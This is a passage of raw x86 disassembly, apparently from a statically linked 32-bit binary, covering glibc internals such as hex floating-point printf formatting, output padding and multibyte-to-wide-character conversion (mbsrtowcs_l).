mov eax, dword [var_13ch_2]
test eax, eax
je 0x806b167
mov eax, dword [var_4h]
mov edx, dword [eax + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806b154
mov dword [eax], 0x20
jmp 0x806a8c7
mov edx, dword [var_4h]
mov dword [var_4h], 0x20
mov dword [esp], edx
jmp 0x806b09b
mov ecx, dword [var_4h]
mov eax, dword [ecx + 0x14]
cmp eax, dword [ecx + 0x18]
jae 0x806b180
mov byte [eax], 0x20
mov eax, dword [var_4h]
inc dword [eax + 0x14]
jmp 0x806a8cd
mov dword [var_4h], 0x20
mov dword [esp], ecx
jmp 0x806b0d0
mov edx, dword [var_134h_2]
mov ecx, dword [var_4h]
mov dword [var_4h], 0x20
mov dword [var_8h], edx
mov dword [esp], ecx
call fcn.08075680
jmp 0x806a87b
sub eax, 0xb
mov dword [var_134h_2], eax
jmp 0x806a834
mov edx, dword [var_8h]
movzx edx, byte [edx + 0xc]
mov byte [var_161h], dl
and edx, 8
je 0x806a834
jmp 0x806a812
mov eax, ecx
inc eax
cmp eax, edx
jl 0x806b22e
test ecx, ecx
jle 0x806b200
movsx eax, byte [ecx + edi - 1]
mov edx, eax
sub eax, 0x30
and edx, 1
cmp eax, 9
jbe 0x806b3cd
test edx, edx
je 0x806b22e
mov eax, dword [var_130h_2]
test eax, eax
jne 0x806a758
movsx eax, byte [var_129h]
mov edx, eax
sub eax, 0x30
and edx, 1
cmp eax, 9
jbe 0x806b3c0
test edx, edx
jne 0x806a758
mov ebx, dword [var_130h_2]
dec ebx
js 0x806b2a4
movzx edx, byte [ebx + edi]
cmp dl, 0x39
mov byte [var_155h], dl
je 0x806b3a8
mov eax, 0
mov dword [var_15ch], 0x80aad14
test eax, eax
je 0x806b26f
mov dword [esp], 5
call section.
mov dword [var_15ch], eax
mov ecx, dword [var_15ch]
mov edx, dword [ecx]
test edx, edx
je 0x806b373
movsx eax, byte [var_155h]
cmp dword [edx + eax*4], 0x65
jle 0x806b35a
mov byte [ebx + edi], 0x30
mov ecx, dword [var_114h]
mov dword [ecx + ebx*4], 0x30
dec ebx
jns 0x806b237
cmp byte [var_129h], 0x39
je 0x806b348
mov eax, 0
mov ebx, 0x80aad14
test eax, eax
je 0x806b2cd
mov dword [esp], 5
call section.
mov ebx, eax
mov edx, dword [ebx]
test edx, edx
je 0x806b31c
movsx eax, byte [var_129h]
cmp dword [edx + eax*4], 0x65
jg 0x806b2eb
inc byte [var_129h]
jmp 0x806a758
mov eax, dword [var_124h]
mov byte [var_129h], 1
test eax, eax
je 0x806b314
add esi, 4
js 0x806a758
mov dword [var_124h], 0
jmp 0x806a758
add esi, 4
jmp 0x806a758
mov edx, 0
test edx, edx
je 0x806b341
mov dword [esp], 3
call section.
mov eax, dword [eax]
mov eax, dword [eax + 0x30]
add eax, 0x200
mov dword [ebx], eax
mov edx, eax
jmp 0x806b2d3
mov eax, dword [0x80a9ab4]
jmp 0x806b331
mov eax, dword [var_8h]
movzx eax, byte [eax + 8]
mov byte [var_129h], al
jmp 0x806a758
inc byte [ebx + edi]
mov eax, dword [var_114h]
inc dword [eax + ebx*4]
test ebx, ebx
jns 0x806a758
jmp 0x806b2a4
mov eax, 0
test eax, eax
je 0x806b3a1
mov dword [esp], 3
call section.
mov eax, dword [eax]
mov edx, dword [var_15ch]
mov eax, dword [eax + 0x30]
add eax, 0x200
mov dword [edx], eax
mov edx, eax
jmp 0x806b27f
mov eax, dword [0x80a9ab4]
jmp 0x806b388
mov edx, dword [var_8h]
mov ecx, dword [var_114h]
mov eax, dword [edx + 8]
mov dword [ecx + ebx*4], eax
movzx eax, byte [edx + 8]
mov byte [ebx + edi], al
jmp 0x806b366
test edx, edx
je 0x806a758
jmp 0x806b22e
test edx, edx
jne 0x806b22e
jmp 0x806b200
mov eax, dword [var_110h]
sub eax, edi
mov dword [var_130h_2], eax
jmp 0x806a758
sub eax, 4
dec dword [var_110h]
cmp dword [eax - 4], 0x30
je 0x806b3ed
jmp 0x806a725
cmp dword [var_130h_2], 0xffffffff
mov eax, 0
mov dword [var_110h], edi
cmovne eax, dword [var_130h_2]
jmp 0x806b3e2
cmp eax, 0x3fe
jle 0x806b438
sub esi, 0x3ff
mov dword [var_124h], 0
jmp 0x806a701
mov eax, 0x3ff
mov dword [var_124h], 1
sub eax, esi
mov esi, eax
jmp 0x806a701
mov ebx, dword [var_18h]
mov eax, dword [var_1ch]
xor edx, edx
mov dword [var_150h], edx
mov esi, ebx
mov dword [var_154h], eax
xor ebx, ebx
or ebx, eax
or esi, edx
mov edx, ebx
or edx, esi
sete al
movzx eax, al
mov dword [var_128h], eax
mov ecx, dword [var_8h]
xor eax, eax
cmp dword [ecx + 8], 0x41
mov dword [var_4h], esi
mov dword [esp], ebx
sete al
mov dword [var_ch], 0x10
mov dword [var_10h], eax
lea eax, [var_1ch]
mov dword [var_8h], eax
call fcn.08063ca0
lea ecx, [var_3ch]
mov edx, dword [var_8h]
mov edi, eax
xor eax, eax
cmp dword [edx + 8], 0x41
mov dword [var_4h], esi
mov dword [esp], ebx
sete al
mov dword [var_ch], 0x10
mov dword [var_8h], ecx
mov dword [var_10h], eax
call fcn.0808d930
mov dword [var_114h], eax
lea eax, [var_2ch]
cmp edi, eax
jbe 0x806b4fc
dec edi
mov byte [edi], 0x30
sub dword [var_114h], 4
cmp edi, eax
mov edx, dword [var_114h]
mov dword [edx], 0x30
ja 0x806b4e1
movzx eax, byte [edi]
inc edi
mov byte [var_129h], al
movzx eax, word [var_14h]
mov esi, eax
and esi, 0x7fff
jne 0x806b536
mov eax, dword [var_128h]
mov dword [var_124h], 0
test eax, eax
jne 0x806a701
mov esi, 0x4001
jmp 0x806a6f7
cmp esi, 0x4001
jle 0x806b549
sub esi, 0x4002
jmp 0x806b429
mov dword [var_124h], 1
mov eax, 0x4002
jmp 0x806b447
mov dword [var_108h_2], 0x80a0fb8
mov dword [var_10ch_2], 0x80a0fd4
jmp 0x806a297
mov ecx, 0
test ecx, ecx
je 0x806b5ab
mov dword [esp], 3
call section.
mov edx, dword [var_8h]
movzx edx, byte [edx + 0xc]
mov byte [var_161h], dl
mov eax, dword [eax]
mov eax, dword [eax + 0x24]
add eax, 0x100
mov dword [ebx], eax
mov edx, eax
jmp 0x806a272
mov eax, dword [0x80a9ab4]
jmp 0x806b598
mov dword [esp], ebx
mov dword [var_4h], esi
mov dword [var_8h], edi
call fcn.08084990
test eax, eax
je 0x806b610
mov eax, 0
mov ebx, 0x80aad18
test eax, eax
je 0x806b5e2
mov dword [esp], 4
call section.
mov ebx, eax
mov edx, dword [ebx]
test edx, edx
je 0x806b668
mov ecx, dword [var_8h]
mov eax, dword [ecx + 8]
test byte [edx + eax*2 + 1], 1
je 0x806b652
mov dword [var_108h_2], 0x80a0fbc
mov dword [var_10ch_2], 0x80a0fe4
lea esi, [esi]
xor eax, eax
lea edi, [var_fch]
mov ecx, 3
cld
rep stosd dword es:[edi], eax
mov edi, dword [var_14h]
mov ebx, dword [var_1ch]
mov esi, dword [var_18h]
mov dword [var_f4h], edi
mov dword [var_fch], ebx
mov dword [var_f8h], esi
mov eax, dword [var_f4h]
shr eax, 0xf
and eax, 1
mov dword [var_118h], eax
jmp 0x806a2a1
mov dword [var_108h_2], 0x80a0fc0
mov dword [var_10ch_2], 0x80a0ff4
jmp 0x806b610
mov eax, 0
test eax, eax
je 0x806b69d
mov dword [esp], 3
call section.
mov edx, dword [var_8h]
movzx edx, byte [edx + 0xc]
mov byte [var_161h], dl
mov eax, dword [eax]
mov eax, dword [eax + 0x24]
add eax, 0x100
mov dword [ebx], eax
mov edx, eax
jmp 0x806b5ec
mov eax, dword [0x80a9ab4]
jmp 0x806b68a
mov eax, dword [ebx]
fld qword [eax]
fst qword [ebp - 0x144]
fst qword [ebp - 0x1c]
fstp qword [esp]
call fcn.08084960
test eax, eax
je 0x806b6ef
mov eax, 0
mov ebx, 0x80aad18
test eax, eax
je 0x806b6d9
mov dword [esp], 4
call section.
mov ebx, eax
mov edx, dword [ebx]
test edx, edx
jne 0x806a272
mov eax, 0
test eax, eax
jmp 0x806b57d
fld qword [ebp - 0x144]
fstp qword [esp]
call fcn.08084930
test eax, eax
je 0x806b744
mov eax, 0
mov ebx, 0x80aad18
test eax, eax
je 0x806b71d
mov dword [esp], 4
call section.
mov ebx, eax
mov edx, dword [ebx]
test edx, edx
je 0x806b767
mov ecx, dword [var_8h]
mov eax, dword [ecx + 8]
test byte [edx + eax*2 + 1], 1
je 0x806b751
mov dword [var_108h_2], 0x80a0fbc
mov dword [var_10ch_2], 0x80a0fe4
mov ebx, dword [var_18h]
mov eax, ebx
shr eax, 0x1f
jmp 0x806b647
mov dword [var_108h_2], 0x80a0fc0
mov dword [var_10ch_2], 0x80a0ff4
jmp 0x806b744
mov eax, 0
test eax, eax
je 0x806b799
mov dword [esp], 3
call section.
mov edx, dword [var_8h]
movzx edx, byte [edx + 0xc]
mov byte [var_161h], dl
mov eax, dword [eax]
mov eax, dword [eax + 0x24]
add eax, 0x100
mov dword [ebx], eax
mov edx, eax
jmp 0x806b723
mov eax, dword [0x80a9ab4]
jmp 0x806b789
mov eax, dword [0x80a9ab4]
jmp 0x806a1e2
mov eax, dword [0x80a9ab4]
jmp 0x806a1bd
mov edx, 0
test edx, edx
je 0x806b800
mov dword [esp], 3
call section.
mov eax, dword [eax + 0x10]
mov ecx, 0
test ecx, ecx
mov eax, dword [eax + 0x2c]
mov dword [var_104h], eax
je 0x806b7f8
mov dword [esp], 3
call section.
mov eax, dword [eax + 0x10]
mov eax, dword [eax + 0xd0]
jmp 0x806a1e8
mov eax, dword [0x80a9ab4]
jmp 0x806b7ea
nop
mov eax, dword [0x80a9ab4]
jmp 0x806b7c9
mov dword [var_ch], str.__printf_fphex
mov dword [var_8h], 0xa3
mov dword [var_4h], str..._sysdeps_generic_printf_fphex.c
mov dword [esp], str.decimal___0__decimalwc___L0
call fcn.0805efc0
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
xor esi, esi
push ebx
sub esp, 0x50
mov dword [var_50h], str.________________0000000000000000
mov eax, dword [arg_ch]
mov edi, dword [arg_8h]
cmp eax, 0x20
je 0x807593d
cmp eax, 0x30
mov dword [var_50h], 0x80a2ba0
je 0x807593d
mov ebx, 0xf
mov esi, esi
mov dword [ebp + ebx*4 - 0x4c], eax
dec ebx
jns 0x8075930
lea eax, [var_4ch]
mov dword [var_50h], eax
mov ebx, dword [arg_10h]
cmp ebx, 0xf
jg 0x807596c
test ebx, ebx
jle 0x8075962
mov eax, dword [edi + 0x94]
mov edx, dword [var_50h]
mov dword [esp], edi
mov dword [var_8h], ebx
mov dword [var_4h], edx
call dword [eax + 0x1c]
add esi, eax
add esp, 0x50
mov eax, esi
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [edi + 0x94]
mov edx, dword [var_50h]
mov dword [esp], edi
mov dword [var_8h], 0x10
mov dword [var_4h], edx
call dword [eax + 0x1c]
add esi, eax
cmp eax, 0x10
jne 0x8075962
sub ebx, 0x10
cmp ebx, 0xf
jg 0x807596c
jmp 0x8075945
push ebp
mov ebp, esp
sub esp, 0xc
mov dword [var_4h], ebx
mov ebx, dword [arg_8h]
mov eax, dword [ebx + 0x5c]
test eax, eax
je 0x8075d40
mov eax, dword [ebx + 0x94]
mov edx, dword [arg_ch]
mov dword [esp], ebx
mov dword [var_sp_4h], edx
call dword [eax + 0xc]
mov ebx, dword [var_4h]
leave
ret
nop
lea esi, [esi]
mov dword [var_sp_4h], 1
mov dword [esp], ebx
call fcn.08076600
jmp 0x8075d23
push ebp
mov eax, 0
mov ebp, esp
sub esp, 0x18
test eax, eax
mov dword [var_4h], ebx
mov ebx, dword [arg_14h]
je 0x8077dd1
mov dword [esp], 3
call section.
mov dword [var_10h], eax
test ebx, ebx
mov eax, 0x80aa9bc
cmovne eax, ebx
mov dword [var_ch], eax
mov eax, dword [arg_10h]
mov dword [var_8h], eax
mov eax, dword [arg_ch]
mov dword [var_sp_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.08078440
mov ebx, dword [var_4h]
leave
ret
mov eax, dword [0x80a9ab4]
jmp 0x8077da1
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x168
mov dword [var_1ch], 0
mov eax, dword [arg_14h]
mov dword [var_30h], 0
mov dword [var_2ch], 1
mov dword [var_34h], 1
mov esi, dword [arg_10h]
mov dword [var_28h], eax
mov eax, dword [arg_18h]
mov ebx, dword [eax]
mov eax, dword [ebx + 0x14]
test eax, eax
je 0x8078738
mov edi, dword [eax]
mov eax, dword [arg_8h]
test eax, eax
je 0x8078650
mov eax, dword [arg_ch]
mov edx, dword [arg_8h]
test esi, esi
mov ecx, 5
mov ebx, dword [eax]
mov dword [var_3ch], edx
lea eax, [edx + esi*4]
mov dword [var_38h], eax
mov dword [var_150h], ebx
je 0x8078642
mov eax, dword [var_150h]
mov dword [var_4h], esi
mov dword [esp], eax
call fcn.08076f30
lea esi, [eax + ebx + 1]
mov eax, dword [edi + 0x14]
mov dword [esp], eax
call fcn.08083520
lea eax, [var_148h]
lea edx, [var_150h]
mov dword [var_sp_1ch], 1
mov dword [var_14h], eax
mov dword [var_18h], 0
mov dword [var_10h], 0
lea eax, [var_3ch]
mov dword [var_ch], esi
mov dword [var_8h], edx
mov dword [var_4h], eax
mov dword [esp], edi
call dword [edi + 0x14]
cmp eax, 4
mov ecx, eax
je 0x8078520
cmp eax, 7
jne 0x8078642
mov ebx, dword [var_150h]
cmp ebx, esi
jne 0x807863a
cmp byte [ebx - 1], 0
je 0x807863a
mov eax, dword [var_38h]
mov edx, dword [var_3ch]
sub eax, edx
sar eax, 2
test eax, eax
mov esi, eax
jne 0x80784b2
mov esi, edx
mov eax, dword [arg_ch]
sub esi, dword [arg_8h]
mov dword [eax], ebx
sar esi, 2
test ecx, ecx
je 0x80785d1
cmp ecx, 4
je 0x80785d1
test ecx, ecx
jne 0x8078574
add esp, 0x168
mov eax, esi
pop ebx
pop esi
pop edi
leave
ret
cmp ecx, 4
jne 0x807859e
test ecx, ecx
je 0x8078567
cmp ecx, 5
je 0x8078567
cmp ecx, 4
je 0x8078567
cmp ecx, 7
je 0x8078567
call fcn.08048b20
mov esi, 0xffffffff
mov dword [eax], 0x54
jmp 0x8078567
cmp ecx, 6
je 0x8078579
cmp ecx, 7
je 0x8078579
cmp ecx, 5
je 0x8078579
mov dword [var_ch], str.__mbsrtowcs_l
mov dword [var_8h], 0x9b
mov dword [var_4h], str.mbsrtowcs_l.c
mov dword [esp], str.status____GCONV_OK__status____GCONV_EMPTY_INPUT__status____GCONV_ILLEGAL_INPUT__status____GCONV_INCOMPLETE_INPUT__status____GCONV_FULL_OUTPUT
call fcn.0805efc0
mov edx, dword [arg_8h]
mov edx, dword [edx + esi*4 - 4]
test edx, edx
jne 0x8078563
test esi, esi
je 0x8078619
mov eax, dword [var_28h]
mov eax, dword [eax]
test eax, eax
jne 0x80785f8
mov eax, dword [arg_ch]
mov dword [eax], 0
dec esi
jmp 0x8078563
mov dword [var_ch], str.__mbsrtowcs_l
mov dword [var_8h], 0x90
mov dword [var_4h], str.mbsrtowcs_l.c
mov dword [esp], str.__data.__statep_____count__0_
jmp 0x80785cc
mov dword [var_ch], str.__mbsrtowcs_l
mov dword [var_8h], 0x8f
mov dword [var_4h], str.mbsrtowcs_l.c
mov dword [esp], str.result___0
jmp 0x80785cc
mov edx, dword [var_3ch]
jmp 0x807854d
mov edx, dword [var_3ch]
mov ebx, dword [var_150h]
jmp 0x807854d
mov eax, dword [arg_ch]
xor esi, esi
mov ebx, dword [eax]
mov dword [var_14ch], ebx
mov dword [esp], ebx
call fcn.08053400
lea ebx, [eax + ebx + 1]
mov eax, dword [var_28h]
mov dword [var_154h], ebx
lea ebx, [var_13ch]
mov edx, dword [eax + 4]
mov eax, dword [eax]
mov dword [var_140h], edx
mov dword [var_144h], eax
lea edx, [var_3ch]
lea eax, [var_144h]
mov dword [var_38h], edx
mov dword [var_28h], eax
mov eax, dword [edi + 0x14]
mov dword [var_3ch], ebx
mov dword [esp], eax
call fcn.08083520
mov edx, dword [var_154h]
lea eax, [var_148h]
mov dword [var_sp_1ch], 1
mov dword [var_14h], eax
mov dword [var_18h], 0
mov dword [var_10h], 0
lea eax, [var_14ch]
mov dword [esp], edi
mov dword [var_ch], edx
mov dword [var_8h], eax
lea edx, [var_3ch]
mov dword [var_4h], edx
call dword [edi + 0x14]
mov edx, dword [var_3ch]
mov ecx, eax
mov eax, edx
sub eax, ebx
sar eax, 2
add esi, eax
cmp ecx, 5
je 0x8078698
test ecx, ecx
je 0x8078709
cmp ecx, 4
jne 0x8078563
mov ebx, dword [edx - 4]
test ebx, ebx
je 0x80785f2
mov dword [var_ch], str.__mbsrtowcs_l
mov dword [var_8h], 0x5f
mov dword [var_4h], str.mbsrtowcs_l.c
mov dword [esp], str.__wchar_t___data.__outbuf___1___L0
jmp 0x80785cc
cmp ebx, 0x809ff60
mov eax, 0x8092dec
je 0x8078481
mov eax, ebx
call fcn.08053a60
mov eax, dword [ebx + 0x14]
jmp 0x8078481
mov eax, dword [0x80aa844]
push ebp
mov ebp, esp
push ebx
mov ebx, dword [arg_8h]
test eax, eax
jne 0x807add1
cmp ebx, 0x10000
setbe al
mov ebx, dword [esp]
leave
movzx eax, al
ret
call section.
cmp ebx, dword [eax + 0x41c]
jmp 0x807adc6
push ebp
xor eax, eax
mov ebp, esp
mov ecx, dword [arg_8h]
mov edx, dword [arg_ch]
cmp dword [ecx], 0
je 0x80783e0
test edx, edx
je 0x80783e0
inc eax
cmp dword [ecx + eax*4], 0
je 0x80783e0
dec edx
je 0x80783e0
inc eax
cmp dword [ecx + eax*4], 0
je 0x80783e0
dec edx
je 0x80783e0
inc eax
cmp dword [ecx + eax*4], 0
je 0x80783e0
dec edx
je 0x80783e0
inc eax
dec edx
cmp dword [ecx + eax*4], 0
je 0x80783e0
test edx, edx
jne 0x80783b4
mov esi, esi
leave
ret
push ebp
xor eax, eax
mov ebp, esp
mov edx, dword [arg_8h]
mov ecx, dword [edx]
test ecx, ecx
je 0x80776c0
mov esi, esi
inc eax
mov ecx, dword [edx + eax*4]
test ecx, ecx
je 0x80776c0
inc eax
mov ecx, dword [edx + eax*4]
test ecx, ecx
je 0x80776c0
inc eax
mov ecx, dword [edx + eax*4]
test ecx, ecx
je 0x80776c0
inc eax
mov ecx, dword [edx + eax*4]
test ecx, ecx
jne 0x80776a0
leave
ret
push ebp
mov ebp, esp
push edi
push esi
push ebx
mov ebx, eax
sub esp, 0x14
mov dword [var_14h], ecx
mov dword [var_10h], edx
movzx eax, byte [ecx]
cmp al, 0x7f
je 0x806f2c4
test al, al
jle 0x806f2c4
sub edx, ebx
movsx esi, al
inc dword [var_14h]
lea eax, [edx + 0x12]
and eax, 0xfffffffc
sub esp, eax
lea edi, [var_1bh]
mov dword [var_8h], edx
mov dword [var_4h], ebx
and edi, 0xfffffff0
mov dword [esp], edi
call fcn.08053740
mov ebx, dword [var_10h]
cmp eax, edi
mov edx, eax
jbe 0x806f2c4
lea esi, [esi]
sub edx, 4
sub ebx, 4
dec esi
mov eax, dword [edx]
mov dword [ebx], eax
jne 0x806f2c0
cmp edx, edi
jbe 0x806f2c4
mov eax, dword [arg_8h]
mov ecx, dword [var_14h]
sub ebx, 4
mov dword [ebx], eax
movzx eax, byte [ecx]
cmp al, 0x7f
je 0x806f2d9
test al, al
jl 0x806f2d9
je 0x806f2d0
inc dword [var_14h]
movsx esi, al
nop
cmp edx, edi
ja 0x806f290
lea esp, [var_ch]
mov eax, ebx
pop ebx
pop esi
pop edi
leave
ret 4
mov eax, dword [var_14h]
movsx esi, byte [eax - 1]
jmp 0x806f2c0
sub edx, 4
sub ebx, 4
mov eax, dword [edx]
cmp edx, edi
mov dword [ebx], eax
ja 0x806f2d9
jmp 0x806f2c4
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x20
mov ebx, dword [arg_ch]
mov edi, dword [arg_8h]
mov dword [esp], 0x80a09c4
call fcn.0807ac80
mov dword [esp], 0x2e
mov dword [var_4h], eax
mov dword [var_10h], eax
call fcn.0807ad50
mov dword [var_14h], eax
mov dword [esp], 0x2c
mov eax, dword [var_10h]
mov dword [var_4h], eax
call fcn.0807ad50
mov edx, ebx
sub edx, edi
mov dword [var_18h], eax
lea eax, [edx + 0x12]
and eax, 0xfffffffc
sub esp, eax
lea eax, [var_1fh]
mov dword [var_4h], edi
mov dword [var_8h], edx
and eax, 0xfffffff0
mov edi, ebx
mov dword [var_1ch], eax
mov dword [esp], eax
call fcn.08053740
mov esi, eax
sub esi, 4
cmp esi, dword [var_1ch]
jb 0x806b93b
lea esi, [esi]
mov eax, dword [esi]
lea ebx, [eax - 0x30]
cmp ebx, 9
ja 0x806b94c
mov eax, 0
sub edi, 4
test eax, eax
je 0x806b945
mov dword [esp], 3
call section.
mov eax, dword [eax]
lea edx, [ebx + 0x33]
and edx, 0xffff
mov eax, dword [eax + edx*4 + 0x24]
sub esi, 4
mov dword [edi], eax
cmp esi, dword [var_1ch]
jae 0x806b900
lea esp, [var_ch]
mov eax, edi
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [0x80a9ab4]
jmp 0x806b922
mov edx, dword [var_10h]
test edx, edx
jne 0x806b958
sub edi, 4
jmp 0x806b931
cmp eax, 0x2e
je 0x806b962
cmp eax, 0x2c
jne 0x806b953
sub edi, 4
cmp eax, 0x2e
mov eax, dword [var_18h]
cmove eax, dword [var_14h]
jmp 0x806b931
push ebp
mov ebp, esp
sub esp, 0x6c
mov dword [var_4h], edi
mov dword [var_ch], ebx
mov dword [var_8h], esi
mov edi, dword [arg_8h]
lea eax, [edi + 0x80]
cmp eax, 0x17f
ja 0x80778a8
cmp edi, 0xffffffff
je 0x80778a8
mov eax, 0
test eax, eax
je 0x807789e
mov dword [esp], 3
call section.
mov ebx, dword [eax]
mov eax, dword [ebx + 0x14]
test eax, eax
je 0x807787e
mov esi, eax
cmp dword [esi + 4], 1
jne 0x80777c9
mov eax, dword [esi]
mov eax, dword [eax + 0x18]
test eax, eax
je 0x80777c9
mov dword [esp], eax
call fcn.08083520
mov ecx, edi
mov eax, dword [esi]
movzx edx, cl
mov dword [var_sp_4h], edx
mov edx, dword [esi]
mov dword [esp], edx
call dword [eax + 0x18]
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
leave
ret
lea eax, [var_3dh]
mov dword [var_24h], 0
mov dword [var_20h], 0
mov dword [var_4ch], eax
mov dword [var_30h], 0
mov dword [var_2ch], 1
lea eax, [var_44h]
mov dword [var_34h], 1
mov dword [var_1ch], 0
mov dword [var_3ch], eax
lea ebx, [var_3ch]
lea eax, [var_40h]
mov dword [var_38h], eax
lea eax, [var_24h]
mov dword [var_28h], eax
mov eax, edi
mov byte [var_3dh], al
mov eax, dword [esi]
mov eax, dword [eax + 0x14]
mov dword [esp], eax
call fcn.08083520
lea eax, [var_48h]
mov edx, dword [esi]
mov dword [var_sp_4h], ebx
mov dword [var_14h], eax
mov dword [var_sp_1ch], 1
mov dword [var_18h], 0
mov eax, dword [var_4ch]
mov dword [var_10h], 0
inc eax
mov dword [var_sp_ch], eax
lea eax, [var_4ch]
mov dword [var_sp_8h], eax
mov eax, dword [esi]
mov dword [esp], eax
call dword [edx + 0x14]
test eax, eax
mov edx, eax
je 0x8077876
cmp eax, 5
je 0x8077876
mov eax, 0xffffffff
cmp edx, 4
cmove eax, dword [var_44h]
mov dword [var_44h], eax
mov eax, dword [var_44h]
jmp 0x80777be
cmp ebx, 0x809ff60
mov esi, 0x8092dec
je 0x8077794
mov eax, ebx
call fcn.08053a60
mov eax, dword [ebx + 0x14]
jmp 0x8077792
mov eax, dword [0x80a9ab4]
jmp 0x8077785
mov eax, 0xffffffff
jmp 0x80777be
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x108
mov eax, dword [arg_ch]
mov dword [var_74h], 0
mov ebx, dword [arg_10h]
mov dword [var_5ch], 0
mov dword [var_60h], 0
mov dword [var_68h], 0
mov dword [var_6ch], 0
mov dword [var_70h], 0
movzx edx, byte [eax + 0xd]
mov dword [var_2ch], 0
mov dword [var_40h], 0
mov eax, edx
shr al, 2
mov ecx, eax
and ecx, 1
and edx, 1
mov dword [var_7ch], ecx
jne 0x8069f03
mov eax, 0
test eax, eax
je 0x8069ef9
mov dword [esp], 3
call section.
mov eax, dword [eax + 4]
mov edx, 0
test edx, edx
mov eax, dword [eax + 0x24]
mov dword [var_54h], eax
je 0x8069eef
mov dword [esp], 3
call section.
mov eax, dword [eax + 4]
mov eax, dword [eax + 0x30]
mov dword [var_58h], eax
mov edx, dword [arg_ch]
mov dword [var_64h], 0
movzx eax, byte [edx + 0xc]
test al, 0x80
je 0x80680b7
test byte [edx + 0xd], 1
jne 0x8069ec8
mov ecx, 0
test ecx, ecx
je 0x8069ebe
mov dword [esp], 3
call section.
mov eax, dword [eax + 4]
mov eax, dword [eax + 0x2c]
mov dword [var_64h], eax
mov edx, dword [var_64h]
movzx eax, byte [edx]
test al, al
jle 0x8069eb2
cmp al, 0x7f
je 0x8069eb2
mov eax, dword [var_7ch]
test eax, eax
je 0x8069e5b
mov eax, dword [arg_ch]
test byte [eax + 0xd], 1
jne 0x8069e31
mov edx, 0
test edx, edx
je 0x8069e27
mov dword [esp], 3
call section.
mov eax, dword [eax + 4]
mov eax, dword [eax + 0x34]
mov dword [var_60h], eax
mov edi, dword [var_7ch]
test edi, edi
je 0x8069e01
mov esi, dword [var_60h]
test esi, esi
je 0x8069df5
mov edx, dword [arg_ch]
movzx eax, byte [edx + 0xc]
test al, 1
je 0x8069c67
mov eax, dword [ebx]
mov ebx, dword [eax]
mov esi, dword [eax + 4]
mov edi, dword [eax + 8]
mov dword [var_1ch], ebx
mov dword [var_18h], esi
mov dword [esp], ebx
mov dword [var_14h], edi
mov dword [var_4h], esi
mov dword [var_8h], edi
call fcn.080849f0
test eax, eax
je 0x8069b80
mov eax, 0
mov ebx, 0x80aad18
test eax, eax
je 0x8068106
mov dword [esp], 4
call section.
mov ebx, eax
mov edx, dword [ebx]
test edx, edx
je 0x8069b4b
mov ecx, dword [arg_ch]
mov eax, dword [ecx + 8]
test byte [edx + eax*2 + 1], 1
je 0x8069b38
mov dword [var_68h], 0x80a0fb4
mov dword [var_6ch], 0x80a0fc4
mov dword [var_40h], 0
mov edx, dword [var_68h]
test edx, edx
je 0x8068445
mov edx, dword [var_40h]
mov eax, dword [arg_ch]
test edx, edx
mov ebx, dword [eax + 4]
jne 0x8068154
test byte [eax + 0xc], 0x50
je 0x8068155
dec ebx
mov ecx, dword [arg_ch]
sub ebx, 3
test byte [ecx + 0xc], 0x20
jne 0x80681a0
test ebx, ebx
jle 0x80681a0
mov eax, dword [var_7ch]
test eax, eax
je 0x8068429
mov eax, dword [arg_8h]
mov dword [var_8h], ebx
mov dword [var_4h], 0x20
mov dword [esp], eax
call fcn.08075900
cmp eax, ebx
je 0x806819a
mov edx, 0xffffffff
lea esp, [var_bp_ch]
mov eax, edx
pop ebx
pop esi
pop edi
leave
ret
mov dword [var_74h], ebx
mov edx, dword [var_40h]
test edx, edx
je 0x8068372
mov eax, dword [var_7ch]
test eax, eax
je 0x8068347
mov ecx, dword [arg_8h]
mov edx, dword [ecx + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806832b
mov dword [eax], 0x2d
add eax, 4
mov dword [edx + 0x10], eax
inc dword [var_74h]
mov eax, dword [var_7ch]
mov esi, 2
test eax, eax
je 0x80682b3
mov edx, dword [var_6ch]
mov eax, dword [var_7ch]
mov ecx, dword [edx]
add edx, 4
test eax, eax
mov dword [var_6ch], edx
je 0x806828a
mov eax, dword [arg_8h]
mov edx, dword [eax + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x8068278
mov dword [eax], ecx
add eax, 4
inc ecx
mov dword [edx + 0x10], eax
je 0x806818b
mov eax, esi
inc dword [var_74h]
dec esi
test eax, eax
jne 0x80681e4
mov eax, dword [arg_ch]
test byte [eax + 0xc], 0x20
je 0x8068257
test ebx, ebx
jle 0x8068257
mov esi, dword [var_7ch]
test esi, esi
je 0x806825f
mov edx, dword [arg_8h]
mov dword [var_8h], ebx
mov dword [var_4h], 0x20
mov dword [esp], edx
call fcn.08075900
cmp eax, ebx
jne 0x806818b
add dword [var_74h], ebx
mov edx, dword [var_74h]
jmp 0x8068190
mov ecx, dword [arg_8h]
mov dword [var_8h], ebx
mov dword [var_4h], 0x20
mov dword [esp], ecx
call fcn.08075680
jmp 0x806824c
mov edx, dword [arg_8h]
mov dword [var_4h], ecx
mov dword [esp], edx
call fcn.08075d10
inc eax
jmp 0x8068211
mov edx, dword [arg_8h]
mov eax, dword [edx + 0x14]
cmp eax, dword [edx + 0x18]
jae 0x80682a2
mov byte [eax], cl
movzx eax, cl
mov ecx, dword [arg_8h]
inc dword [ecx + 0x14]
jmp 0x8068287
movzx eax, cl
mov dword [esp], edx
mov dword [var_4h], eax
call fcn.0804d840
jmp 0x8068287
mov eax, dword [var_68h]
mov edi, dword [var_7ch]
movsx ecx, byte [eax]
inc eax
test edi, edi
mov dword [var_68h], eax
je 0x8068302
mov eax, dword [arg_8h]
mov edx, dword [eax + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x80682f0
mov dword [eax], ecx
add eax, 4
inc ecx
mov dword [edx + 0x10], eax
je 0x806818b
mov eax, esi
inc dword [var_74h]
dec esi
test eax, eax
jne 0x80682b3
jmp 0x8068221
